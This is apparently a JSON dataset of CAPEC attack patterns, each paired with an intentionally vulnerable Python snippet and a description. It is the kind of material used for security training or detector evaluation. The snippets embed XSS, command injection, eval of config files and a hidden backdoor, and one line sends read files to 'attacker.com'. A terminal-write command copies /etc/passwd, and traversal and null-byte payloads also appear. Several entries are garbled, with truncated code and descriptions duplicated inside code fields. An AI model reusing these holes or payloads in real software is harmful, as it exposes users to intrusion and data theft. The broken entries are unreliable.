        "code_snippet": "\"\"\"from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    # Get user query from URL parameters\n    query = request.args.get('q', '')\n    \n    # Vulnerable: Direct inclusion of user input without sanitization\n    html_response = f\\\"\\\"\\\"\n    <html>\n        <head><title>Search Results</title></head>\n        <body>\n            <h1>Search Results for: {query",
        "description": "\"This code demonstrates a vulnerable web application that accepts user input via GET parameters and reflects it directly in the HTML response without proper sanitization. An attacker can exploit this by crafting a malicious URL with script tags in the 'q' parameter (e.g., '?q=<script>alert(1)</script>'), leading to XSS when the victim visits the URL. The code violates multiple security principles by not encoding HTML special characters, improperly handling URI-encoded input, and exposing sensitive data in GET parameters.\""
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "from http.server import HTTPServer, BaseHTTPRequestHandler\nimport requests\n\nclass VulnerableProxy(BaseHTTPRequestHandler):\n    def do_POST(self):\n        content_length = self.headers.get('Content-Length')\n        transfer_encoding = self.headers.get('Transfer-Encoding')\n        \n        # Vulnerable: Inconsistent handling of content length vs transfer encoding\n        if content_length and transfer_encoding:\n            body_len = int(content_length)\n        elif transfer_encoding:\n            body_len = -1\n        else:\n            body_len = int(content_length) if content_length else 0\n            \n        body = self.rfile.read(body_len)\n        \n        # Vulnerable: No validation of headers before forwarding\n        headers = dict(self.headers)\n        \n        # Vulnerable: Blindly forwarding request to backend\n        backend_url = f'http://backend-server{self.path}'\n        response = requests.post(\n            backend_url,\n            data=body,\n            headers=headers,\n            verify=False\n        )\n        \n        self.send_response(response.status_code)\n        self.end_headers()\n        self.wfile.write(response.content)\n\nserver = HTTPServer(('localhost', 8080), VulnerableProxy)\nserver.serve_forever()",
        "description": "This code implements a vulnerable HTTP proxy that demonstrates multiple security issues related to HTTP Request Smuggling. The proxy inconsistently handles Content-Length and Transfer-Encoding headers, fails to properly validate or sanitize HTTP headers, and blindly forwards requests to a backend server. These vulnerabilities could allow an attacker to perform HTTP Request Smuggling attacks, HTTP Request Splitting, and Server-Side Request Forgery (SSRF). The code also acts as a confused deputy by not preserving the original request source information."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "def process_http_response(response_data):\n    user_input = response_data.get('content', '')\n    \n    # Vulnerable: No sanitization of CRLF or special characters\n    custom_header = f'X-Custom-Header: {user_input}'\n    \n    # Vulnerable: Direct concatenation of headers\n    response = f'HTTP/1.1 200 OK\\r\\n'\n    response += f'Content-Length: 100\\r\\n'\n    response += f'{custom_header}\\r\\n'\n    response += '\\r\\n'\n    response += f'<html><body>{user_input}</body></html>'\n    \n    # Vulnerable: Direct transmission without proper encoding\n    def send_response(sock):\n        sock.send(response.encode())\n    \n    return response",
        "description": "This vulnerable code demonstrates HTTP response splitting/smuggling by allowing unvalidated user input to be directly inserted into HTTP headers and response body. The code fails to sanitize CRLF sequences and special characters, enabling an attacker to inject additional headers or manipulate the response structure. The lack of proper encoding and consistent interpretation of HTTP elements makes it susceptible to response splitting attacks."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "def load_config(config_path):\n    with open(config_path, 'r') as f:\n        config_data = f.read()\n    \n    # Dangerous: Using eval to parse configuration\n    settings = eval(config_data)\n    \n    # Dangerous: Loading and executing a module from config\n    if 'plugin_path' in settings:\n        import imp\n        plugin = imp.load_source('plugin', settings['plugin_path'])\n        plugin.initialize()\n    \n    return settings\n\ndef initialize_app():\n    config = load_config('app_config.py')\n    # Use potentially malicious configuration\n    db_connection = config['database_connection']\n    execute_command(config['startup_command'])",
        "description": "This vulnerable code demonstrates unsafe loading and execution of configuration files. It uses eval() to parse configuration data and dynamically loads Python modules specified in the config, allowing an attacker to execute arbitrary code by modifying the configuration file. The code lacks proper validation of file paths, permission checks, and input sanitization."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "class AdminInterface:\n    def __init__(self):\n        self._debug_mode = False\n        self._hidden_commands = {\n            'backdoor': self._backdoor_access,\n            'debug': self._toggle_debug\n        }\n    \n    def process_command(self, command, *args):\n        # No authentication check performed\n        if command in self._hidden_commands:\n            return self._hidden_commands[command](*args)\n        return 'Command not found'\n    \n    def _backdoor_access(self):\n        return 'System root access granted'\n    \n    def _toggle_debug(self):\n        self._debug_mode = not self._debug_mode\n        return f'Debug mode: {self._debug_mode}'\n\n# Usage example\nadmin = AdminInterface()\nresult = admin.process_command('backdoor')  # Anyone can access critical functions",
        "description": "This code demonstrates an administrative interface with undocumented backdoor commands that lack proper authentication and authorization checks. The interface exposes low-level system functionality through hidden commands that can be discovered and exploited. Any user can access critical administrative functions without verification, violating security principles by failing to implement protection mechanisms."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "class UserDataManager:\n    def __init__(self):\n        self.temp_buffer = []\n        self.cache = {}\n    \n    def process_user_data(self, user_data):\n        # Store sensitive data in cleartext\n        self.temp_buffer = [\n            {'ssn': '123-45-6789',\n             'credit_card': '4111-1111-1111-1111',\n             'password': 'secretpass123'}\n        ]\n        \n        # Cache sensitive data without encryption\n        self.cache['user_credentials'] = {\n            'username': 'admin',\n            'api_key': 'sk_live_abcdef123456',\n            'auth_token': 'Bearer xyz789'\n        }\n        \n        # Improper cleanup when freeing resources\n        self.temp_buffer = None  # Does not properly clear sensitive data\n        \n        # Write sensitive data to temporary file without encryption\n        with open('temp_data.txt', 'w') as f:\n            f.write(str(user_data))\n            \n        return 'Data processed'",
        "description": "This code demonstrates multiple vulnerable practices in handling sensitive data, including storing sensitive information in cleartext, improper data cleanup, caching sensitive data without encryption, and writing sensitive data to temporary files without proper protection. The code fails to implement secure data handling practices and leaves sensitive information exposed in various storage locations."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "import os\nimport sys\n\ndef load_library(lib_name):\n    # Vulnerable: allows user-controlled library paths\n    user_lib_path = os.environ.get('USER_LIB_PATH', '')\n    sys.path.insert(0, user_lib_path)\n    \n    try:\n        # Dynamically imports library without validation\n        module = __import__(lib_name)\n        return module\n    except ImportError:\n        return None\n\ndef run_application():\n    config = {\n        'db_password': 'plaintext_password',  # CWE-555: plaintext password\n        'lib_path': '/user/input/path'        # CWE-73: user-controlled path\n    }\n    \n    # CWE-99: Unsanitized resource identifier\n    lib_name = input('Enter library name to load: ')\n    \n    # CWE-426: Uses untrusted search path\n    loaded_lib = load_library(lib_name)\n    \n    if loaded_lib:\n        loaded_lib.execute()\n\nrun_application()",
        "description": "This code demonstrates a vulnerable library loading mechanism where an attacker can manipulate the library search path through environment variables and user input. It includes plaintext credentials in configuration, allows direct user input for library names, and uses unvalidated search paths for loading external resources. An attacker could exploit this by placing malicious libraries in the controlled path location."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "from flask import Flask, request, make_response, session\nimport json\n\napp = Flask(__name__)\napp.secret_key = 'super-secret-key'\n\nclass ShoppingCart:\n    def __init__(self):\n        self.items = {}\n        self.prices = {'item1': 100, 'item2': 200}\n\n    def process_order(self, cart_cookie):\n        try:\n            cart_data = json.loads(cart_cookie)\n            total = 0\n            for item, price in cart_data['items'].items():\n                total += price  # Vulnerable: no price verification against server-side data\n            return total\n        except:\n            return 0\n\n@app.route('/checkout')\ndef checkout():\n    cart = ShoppingCart()\n    cart_cookie = request.cookies.get('cart_data')  # Vulnerable: trust client-side data\n    \n    if 'user_type' in request.cookies:\n        user_type = request.cookies.get('user_type')  # Vulnerable: trust user privileges from cookie\n    \n    total = cart.process_order(cart_cookie)\n    \n    response = make_response(f'Order total: {total}')\n    response.set_cookie('cart_data', cart_cookie)  # Vulnerable: persist unvalidated data\n    return response",
        "description": "This vulnerable code demonstrates client-side data manipulation risks in an e-commerce application. It accepts a shopping cart stored in cookies without validation, allowing price manipulation. It also trusts user privileges stored in cookies and lacks integrity checks for sensitive data. The code persists potentially tampered data and fails to validate parameters properly."
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "def process_terminal_command(user_input):\n    terminal_file = '/dev/pts/0'  # Target user's terminal\n    with open(terminal_file, 'w') as term:\n        malicious_command = f'cp /etc/passwd /tmp/stolen_passwd && echo \"data\" > {terminal_file}'\n        term.write(malicious_command)\n        # Wait for user to press enter\n        term.flush()",
        "description": "This vulnerable code attempts to write malicious commands directly to another user's terminal device without proper access controls or input validation. It writes a command that, if executed, will copy sensitive system files to an attacker-accessible location. The code demonstrates poor security practices by allowing direct terminal writes and command injection opportunities."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "def process_email_headers(email_data):\n    headers = {}\n    raw_headers = email_data.split('\\n\\n')[0]\n    \n    for line in raw_headers.split('\\n'):\n        if ': ' in line:\n            key, value = line.split(': ', 1)\n            # Vulnerable: No sanitization of meta-characters or header injection\n            headers[key] = value.strip()\n    \n    # Vulnerable: Direct command execution using header values\n    if 'X-Custom-Action' in headers:\n        os.system(headers['X-Custom-Action'])\n    \n    # Vulnerable: Unsafe header forwarding to HTML context\n    html_content = f\"<div>{headers.get('Subject', '')}</div>\"\n    return html_content",
        "description": "This vulnerable code processes email headers without proper sanitization of meta-characters and special sequences. It allows header injection, command injection through custom headers, and XSS via unsanitized header values rendered in HTML. The code demonstrates multiple vulnerabilities including improper neutralization of control sequences (CWE-150), argument injection (CWE-88), and improper encoding of output (CWE-116)."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "def process_mime_email(email_data):\n    mime_buffer = bytearray(1024)\n    header = b'Content-Type: '\n    # Vulnerable MIME parsing\n    content_type = email_data.get('content-type', '')\n    content = email_data.get('content', '')\n    \n    # Unsafe buffer copy without size check\n    mime_buffer[0:len(header)] = header\n    mime_buffer[len(header):len(header) + len(content_type)] = content_type.encode()\n    \n    # Unsafe file handling based on extension\n    if content_type.lower().endswith('jpeg'):\n        with open(f'attachment.{content_type}', 'wb') as f:\n            f.write(content.encode())\n    \n    return mime_buffer",
        "description": "This vulnerable code demonstrates a MIME processing function that contains multiple security flaws: a classic buffer overflow through unchecked buffer copying, improper input validation of MIME content, and unsafe file handling based on file extensions. The function fails to validate buffer boundaries and blindly copies data, potentially allowing an attacker to overflow the fixed-size mime_buffer. It also lacks proper MIME content validation and relies on unsafe file extension checking."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "def process_user_command(user_input):\n    # First parser: replace encoded characters\n    parsed_input = user_input.replace('%20', ' ').replace('%2F', '/')\n    \n    # Input validation - checks for dangerous commands\n    if any(cmd in parsed_input.lower() for cmd in ['rm', 'del', 'format']):\n        return 'Invalid command'\n    \n    # Second parser: decode shell special characters\n    final_input = parsed_input.replace('\\\\;', ';').replace('\\\\&', '&')\n    \n    # Execute the command\n    import os\n    return os.system(final_input)",
        "description": "This vulnerable code demonstrates the CAPEC attack pattern by implementing multiple parsing stages with validation occurring between them. An attacker can bypass the validation by providing input like 'rm%20-rf' or 'del\\\\;/q', which will pass the validation check but be transformed into dangerous commands after the second parsing stage. The code violates CWE-181 by validating before all filtering is complete and CWE-78 by failing to properly neutralize special elements in OS commands."
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "def process_image_file(filename):\n    buffer = bytearray(1024)\n    with open(filename, 'rb') as f:\n        data = f.read()\n        # Vulnerable: No size check before copy\n        for i in range(len(data)):\n            buffer[i] = data[i]  # Potential buffer overflow\n\n        # Vulnerable: Relies only on extension for processing\n        if filename.endswith('.jpg') or filename.endswith('.jpeg'):\n            process_jpeg(buffer)\n        elif filename.endswith('.png'):\n            process_png(buffer)\n\ndef process_jpeg(data):\n    # Process JPEG data without bounds checking\n    header = data[0:100]  # Can read beyond buffer bounds\n    # ... process image data ...",
        "description": "This code demonstrates a vulnerable image processing function that contains multiple security flaws: it performs an unchecked buffer copy that can lead to buffer overflow, relies solely on file extensions for determining file type, and performs unsafe memory operations without proper bounds checking. The code assumes a fixed buffer size and copies data without verifying the input size, making it vulnerable to buffer overflow attacks through specially crafted image files."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "def process_symlink(symlink_path):\n    # Buffer to store file contents\n    buffer = bytearray(64)\n    \n    # Open and read symbolic link target\n    with open(os.path.realpath(symlink_path), 'rb') as f:\n        # Vulnerable: No size checking before copy\n        data = f.read()\n        # Potential buffer overflow - no bounds checking\n        for i in range(len(data)):\n            buffer[i] = data[i]  # Can write beyond buffer bounds\n            \n    # Process the buffer contents\n    command = buffer.decode('utf-8')\n    # Vulnerable: Execute command from symlink without validation\n    os.system(command)",
        "description": "This code demonstrates a vulnerable implementation that processes symbolic links without proper bounds checking or input validation. It contains multiple vulnerabilities: a classic buffer overflow due to unchecked copying of data into a fixed-size buffer, improper input validation of symlink contents, and command injection vulnerability by directly executing contents from the symlink. The code assumes the symlink path and contents are trusted, which can be exploited by creating malicious symbolic links that overflow the buffer or inject dangerous commands."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "def process_config_file(config_file_path):\n    buffer = bytearray(64)  # Fixed size buffer\n    with open(config_file_path, 'r') as f:\n        config_data = f.read()\n        # Vulnerable: No size check before copying\n        for i, char in enumerate(config_data):\n            buffer[i] = ord(char)  # Potential buffer overflow\n        # Process configuration tags\n        if b'<size>' in buffer:\n            size_start = buffer.find(b'<size>') + 6\n            size_end = buffer.find(b'</size>')\n            size_value = int(buffer[size_start:size_end])  # Potential integer overflow\n            # Vulnerable: No validation on size_value\n            new_buffer = bytearray(size_value)\n            new_buffer[:] = buffer[:size_value]  # Potential out of bounds write\n        return buffer",
        "description": "A vulnerable configuration file parser that demonstrates multiple buffer-related vulnerabilities including classic buffer overflow (CWE-120), improper bounds checking (CWE-119), and integer overflow (CWE-680). The code processes configuration data with tags but fails to validate input sizes, allowing potential buffer overflows through oversized input strings. It also includes unsafe integer operations and improper input validation, making it susceptible to malicious configuration files."
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "def process_user_data(input_str):\n    # Allocate fixed buffer for expanded data\n    output_buffer = bytearray(64)\n    \n    # Expand input by adding padding between characters\n    expanded = ''\n    for char in input_str:\n        expanded += char + 'X' * 3  # Add 3 'X' characters after each input char\n    \n    # Copy expanded data to buffer without size check\n    for i in range(len(expanded)):\n        output_buffer[i] = ord(expanded[i])  # Potential buffer overflow\n    \n    return bytes(output_buffer)",
        "description": "This code demonstrates a buffer overflow vulnerability caused by data expansion during processing. It allocates a fixed-size buffer but fails to check if the expanded input will fit within the buffer's bounds. The input string is expanded by adding padding characters between each original character, potentially causing the expanded data to exceed the buffer size of 64 bytes. When copying the expanded data, the code doesn't validate array bounds, leading to a buffer overflow condition."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "from flask import Flask, request\nimport os\n\napp = Flask(__name__)\n\n@app.route('/get_file')\ndef get_file():\n    filename = request.args.get('file')\n    if filename:\n        # Vulnerable: No validation of file path or type\n        with open(filename, 'r') as f:\n            content = f.read()\n            # Sends local file content to external server\n            requests.post('http://attacker.com/collect', data={'content': content})\n        return content\n    return 'No file specified'\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    # Vulnerable: Relies only on file extension\n    if file.filename.endswith('.txt'):\n        file.save(os.path.join('uploads', file.filename))\n    return 'File uploaded'",
        "description": "This code demonstrates multiple vulnerabilities including improper handling of file paths allowing local file inclusion, reliance on file extensions for security decisions, and sensitive data exposure through GET parameters. The code allows unrestricted access to local files and sends their contents to an external server, while also featuring unsafe file upload handling."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "def authenticate_user(username, password):\n    max_attempts = 999999  # No limit on authentication attempts\n    stored_passwords = {\n        'admin': 'password123',  # Weak password\n        'user': '12345',\n        'john': 'abc123'\n    }\n    \n    if username in stored_passwords:\n        if password == stored_passwords[username]:\n            return True\n    return False\n\ndef password_check(password):\n    # No password complexity requirements\n    if len(password) >= 1:\n        return True\n    return False\n\ndef try_all_passwords():\n    import string\n    import itertools\n    chars = string.ascii_lowercase + string.digits\n    \n    for length in range(1, 8):  # Try passwords up to length 7\n        for guess in itertools.product(chars, repeat=length):\n            password = ''.join(guess)\n            if authenticate_user('admin', password):\n                return password\n    return None",
        "description": "This code demonstrates a vulnerable authentication system that is susceptible to brute force attacks. It lacks password complexity requirements, has no limit on authentication attempts, uses single-factor authentication, and stores passwords in plaintext. The try_all_passwords() function shows how an attacker could systematically attempt every possible password combination until finding a match."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "\"\"\"\ndef reset_password(username, email):\n    user = db.get_user(username)\n    if user and user.email == email:\n        # Generate simple predictable reset token using timestamp\n        reset_token = str(int(time.time()))\n        \n        # Store reset token in plaintext\n        user.reset_token = reset_token\n        \n        # Send reset link with token in query parameter\n        reset_link = f'http://example.com/reset?token={reset_token",
        "description": "\"This code implements an insecure password recovery mechanism that includes several vulnerabilities: using a predictable reset token based on timestamp, storing the token in plaintext, transmitting the token insecurely via URL, no password complexity requirements, and storing passwords in a reversible format (base64 encoding). The reset link is sent over regular email, potentially exposing the token to interception.\""
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
        "code_snippet": "\"\"\"\nimport xml.etree.ElementTree as ET\nfrom flask import Flask, request\nimport requests\n\napp = Flask(__name__)\nservice_registry = {",
        "description": "\"This vulnerable code implements a service registry that allows registration and lookup of web services. It contains multiple security issues: lack of authentication for service registration, no input validation for service lookups, cleartext storage of service information, exposed WSDL handling without proper validation, and no verification of service authenticity before execution. An attacker could register malicious services, perform injection attacks through the service name parameter, or intercept sensitive information from WSDL files.\""
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "def process_filename(user_input):\n    # Vulnerable function that processes a filename from user input\n    file_path = '/var/www/uploads/' + user_input\n    try:\n        with open(file_path, 'rb') as f:\n            if b'\\x00' in f.read():\n                return 'File contains null bytes'\n            else:\n                return 'File is valid'\n    except:\n        return 'Error processing file'",
        "description": "This vulnerable code snippet demonstrates improper handling of null bytes in user input for file operations. The code fails to properly validate and sanitize input containing null bytes, which could allow an attacker to bypass security checks or manipulate file paths. By injecting null bytes, an attacker could potentially truncate the file path string and access files outside the intended directory."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "\"\"\"\ndef verify_filename(filename):\n    # Vulnerable function that checks if filename ends with '.txt'\n    if filename.endswith('.txt'):\n        # Assume this opens the file in a protected directory\n        with open('/safe/directory/' + filename, 'r') as f:\n            return f.read()\n    return None\n\ndef exploit_example():\n    # Malicious input using null byte to bypass check\n    malicious_filename = 'malicious.php\\\\x00.txt'\n    # This passes the .txt check but may be processed as .php\n    # by some systems after null termination\n    content = verify_filename(malicious_filename)\n    return content\n\"\"\",\n    \"description\": \"This code demonstrates a vulnerable file handling system that fails to properly validate and neutralize null bytes in input filenames. The verification function checks if a filename ends with '.txt', but an attacker can bypass this check by inserting a null byte before the .txt extension. When processed by the system, the filename may be interpreted as ending at the null byte, potentially allowing access to files with different extensions.\"",
        "description": "\"This code demonstrates a vulnerable file handling system that fails to properly validate and neutralize null bytes in input filenames. The verification function checks if a filename ends with '.txt', but an attacker can bypass this check by inserting a null byte before the .txt extension. When processed by the system, the filename may be interpreted as ending at the null byte, potentially allowing access to files with different extensions.\""
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request\nimport mysql.connector\n\napp = Flask(__name__)\n\n@app.route('/user_details', methods=['GET'])\ndef get_user_details():\n    user_id = request.args.get('id')\n    db = mysql.connector.connect(\n        host=\\\"localhost\\\",\n        user=\\\"admin\\\",\n        password=\\\"secretpass123\\\",\n        database=\\\"users\\\"\n    )\n    cursor = db.cursor()\n    \n    try:\n        query = f\\\"SELECT * FROM users WHERE user_id = {user_id",
        "description": "\"This vulnerable code demonstrates multiple security issues: it uses GET method with sensitive query parameters, performs unvalidated SQL queries leading to SQL injection, exposes sensitive database information in error messages, and allows information disclosure through error responses. The error handler reveals detailed system information including database configuration and query details.\""
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
        "code_snippet": "\"\"\"\nimport hashlib\n\nclass UserAuth:\n    def __init__(self):\n        self.user_db = {",
        "description": "\"This vulnerable code demonstrates weak password storage using MD5 hashing (easily broken with rainbow tables), no password complexity requirements, single-factor authentication, and no password aging mechanism. The hashing implementation uses insufficient computational effort, making it susceptible to rapid brute-force attacks using pre-computed rainbow tables.\""
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "class BankingClient:\n    def __init__(self):\n        self.balance = 1000\n        self.is_admin = False\n    \n    def verify_transaction(self, transaction_data):\n        # Client-side only validation\n        if 'amount' in transaction_data and transaction_data['amount'] > 0:\n            return True\n        return False\n    \n    def process_transaction(self, transaction_data):\n        # Dangerous: Client-side security check\n        if self.verify_transaction(transaction_data):\n            self.balance -= transaction_data['amount']\n            return {'status': 'success', 'new_balance': self.balance}\n        return {'status': 'failed'}\n    \n    def admin_access(self):\n        # Dangerous: Client-side admin check\n        if self.is_admin:\n            return True\n        return False",
        "description": "This vulnerable code demonstrates client-side enforcement of server-side security (CWE-602). The banking client performs security-critical validations locally, which can be easily bypassed. Transaction verification and admin access checks are performed client-side, allowing attackers to modify the client code or replay modified transactions to bypass security controls. The code lacks proper server-side validation and authentication mechanisms."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request\nimport requests\n\napp = Flask(__name__)\n\nAPI_KEY = \"sensitive_api_key_12345\"\nUSER_DATA = {",
        "description": "\"A vulnerable REST API implementation that exposes sensitive data through query parameters, lacks proper SSL verification, and implements weak authentication. The code stores sensitive information in query strings, doesn't validate communication endpoints, and fails to properly secure critical state data.\""
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request\nfrom database import db\n\napp = Flask(__name__)\n\n@app.route('/user/<user_id>', methods=['GET', 'DELETE', 'PUT'])\ndef manage_user(user_id):\n    # No authentication or authorization check\n    if request.method == 'GET':\n        return db.get_user(user_id)\n    elif request.method == 'DELETE':\n        return db.delete_user(user_id)\n    elif request.method == 'PUT':\n        new_data = request.get_json()\n        return db.update_user(user_id, new_data)\n\n@app.route('/admin/settings', methods=['GET', 'PUT'])\ndef manage_settings():\n    # Assumes GET requests are safe and don't need authorization\n    if request.method == 'GET':\n        return db.get_admin_settings()\n    elif request.method == 'PUT':\n        if 'admin' in request.headers.get('role', ''):\n            new_settings = request.get_json()\n            return db.update_admin_settings(new_settings)\n\"\"\",\n    \"description\": \"This vulnerable code exposes REST API endpoints without proper access control mechanisms. It blindly trusts HTTP methods, particularly GET requests, and lacks proper authorization checks. The code allows any user to perform sensitive operations like user management and accessing admin settings. It incorrectly assumes GET requests are safe and don't require authorization, while only implementing basic role checking for PUT requests on admin settings.\"",
        "description": "\"This vulnerable code exposes REST API endpoints without proper access control mechanisms. It blindly trusts HTTP methods, particularly GET requests, and lacks proper authorization checks. The code allows any user to perform sensitive operations like user management and accessing admin settings. It incorrectly assumes GET requests are safe and don't require authorization, while only implementing basic role checking for PUT requests on admin settings.\""
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "import time\n\ndef generate_session_id(user_id):\n    # Predictable session ID generation based on timestamp and user ID\n    session_id = str(int(time.time())) + str(user_id)\n    return session_id\n\ndef authenticate_user(username, password):\n    # Simplified authentication\n    user_id = 123  # Assume valid user\n    session_id = generate_session_id(user_id)\n    # Store session without validation or expiration\n    active_sessions[session_id] = username\n    return session_id\n\ndef validate_session(session_id):\n    # No proper validation of session origin or randomness\n    if session_id in active_sessions:\n        return True\n    return False\n\nactive_sessions = {}\n\n# Example usage\nsession = authenticate_user('alice', 'password123')\n# Attacker can predict session_id based on timestamp\npredicted_session = str(int(time.time())) + '123'",
        "description": "This vulnerable code demonstrates predictable session ID generation using a simple concatenation of timestamp and user ID. The code lacks proper entropy in session generation, performs insufficient session validation, and doesn't implement proper session management. The session IDs are easily guessable, and there's no protection against session fixation or hijacking attacks. The code also fails to invalidate existing sessions and doesn't implement proper authorization checks."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "from flask import Flask, session, request\n\ndef authenticate_user(username, password):\n    # Simplified auth logic\n    return username == 'admin' and password == 'password123'\n\napp = Flask(__name__)\napp.secret_key = 'fixed_secret_key'\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    \n    if authenticate_user(username, password):\n        # Vulnerable: Session ID is predictable and not regenerated\n        session['session_id'] = f'session_{username}_123'\n        session['authenticated'] = True\n        session['user_role'] = 'admin'\n        \n        # Vulnerable: Setting sensitive data in persistent cookie\n        response = app.make_response('Login successful')\n        response.set_cookie('auth_token', session['session_id'], httponly=False)\n        return response\n\n@app.route('/admin')\ndef admin_panel():\n    # Vulnerable: No proper session validation\n    if session.get('authenticated'):\n        return f\"Welcome {session.get('user_role')}\"\n    return 'Unauthorized'",
        "description": "This vulnerable code demonstrates session handling flaws including session fixation, replay attacks, and improper session validation. The code uses predictable session IDs, stores sensitive information in cookies, lacks proper session regeneration after login, and performs insufficient session validation. The authentication state can be replayed or hijacked by capturing the session ID or cookie."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "from flask import Flask, session, request, redirect\n\ndef create_session(user_id):\n    # Vulnerable: Accepts session ID from client\n    if 'session_id' in request.args:\n        session['id'] = request.args.get('session_id')\n    else:\n        session['id'] = 'default_session'\n\ndef login():\n    username = request.form.get('username')\n    password = request.form.get('password')\n    \n    if authenticate(username, password):\n        # Vulnerable: Does not regenerate session ID after login\n        session['authenticated'] = True\n        session['user_role'] = 'admin'\n        return redirect('/dashboard')\n    \n    return 'Login failed'\n\ndef authenticate(username, password):\n    # Basic authentication logic\n    return username == 'admin' and password == 'password123'",
        "description": "This vulnerable code demonstrates session fixation by accepting client-provided session IDs and failing to regenerate session identifiers after authentication. The application maintains the same session ID before and after privilege elevation, allowing an attacker to predict and hijack authenticated sessions. It also demonstrates improper session management and relies on client-side parameters for security-critical operations."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/transfer_money', methods=['POST'])\ndef transfer_money():\n    # No CSRF protection implemented\n    # No authentication check\n    amount = request.form.get('amount')\n    destination = request.form.get('destination')\n    \n    # Process transfer without verification\n    response = make_response('Transfer successful')\n    \n    # Set cookie without SameSite attribute\n    response.set_cookie(\n        'session_token',\n        'user123',\n        secure=False,\n        httponly=False\n    )\n    \n    return response\n\n@app.route('/form')\ndef display_form():\n    return '''\n    <form action=\"/transfer_money\" method=\"POST\">\n        <input type=\"hidden\" name=\"amount\" value=\"1000\">\n        <input type=\"hidden\" name=\"destination\" value=\"attacker_account\">\n        <input type=\"submit\" value=\"Click Here!\">\n    </form>\n    '''",
        "description": "This vulnerable code demonstrates a banking application endpoint that processes money transfers without CSRF protection, proper authentication, or secure cookie handling. The transfer_money endpoint accepts POST requests without verifying the authenticity of the request or the user's session. The cookie is set without the SameSite attribute and without secure flags. An attacker can create a malicious form that, when clicked by an authenticated user, will trigger unauthorized money transfers using the victim's session."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/post_comment', methods=['POST'])\ndef post_comment():\n    user_comment = request.form.get('comment')\n    # Vulnerable: directly embedding user input in HTML template\n    html = f'''\n    <div class='comment'>\n        <p>{user_comment}</p>\n    </div>\n    '''\n    return render_template_string(html)\n\n@app.route('/profile')\ndef profile():\n    # Vulnerable: unfiltered user input in img tag\n    avatar_url = request.args.get('avatar')\n    html = f'''\n    <img src=\"{avatar_url}\" alt=\"Profile Picture\">\n    '''\n    return render_template_string(html)",
        "description": "This code demonstrates a vulnerable web application that allows XSS attacks through unfiltered user input in both comment posting and profile image loading. It directly embeds user input into HTML templates without proper sanitization, allowing attackers to inject malicious scripts through comment content or image tag attributes."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "from flask import Flask, request, send_file\n\ndef serve_file(filename):\n    # Vulnerable file serving function that doesn't properly validate URL encoding\n    try:\n        # Basic attempt to sanitize path, but vulnerable to encoded traversal\n        safe_filename = filename.replace('../', '')\n        # Doesn't handle multiple encodings or alternate representations\n        return send_file(safe_filename)\n    except:\n        return 'File not found', 404\n\napp = Flask(__name__)\n\n@app.route('/download/<path:filename>')\ndef download_file(filename):\n    # Vulnerable to encoded path traversal\n    # Example attack: /download/%2e%2e%2f%2e%2e%2f/etc/passwd\n    return serve_file(filename)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
